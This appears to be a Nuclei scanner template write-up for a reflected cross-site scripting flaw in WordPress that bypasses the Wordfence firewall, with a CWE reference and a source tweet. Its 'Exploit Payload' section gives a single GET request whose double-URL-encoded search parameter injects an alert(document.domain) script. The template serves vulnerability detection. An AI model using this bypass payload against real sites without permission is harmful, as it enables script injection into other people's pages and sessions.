# Nuclei Template: Wordpress Wordfence - Cross-Site Scripting
**Template ID:** wordpress-wordfence-waf-bypass-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`wordpress-wordfence-waf-bypass-xss.yaml`)

## Vulnerability Information & PoC

## Description
Wordpress Wordfence is vulnerable to cross-site scripting.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
```

## References
- https://twitter.com/naglinagli/status/1382082473744564226
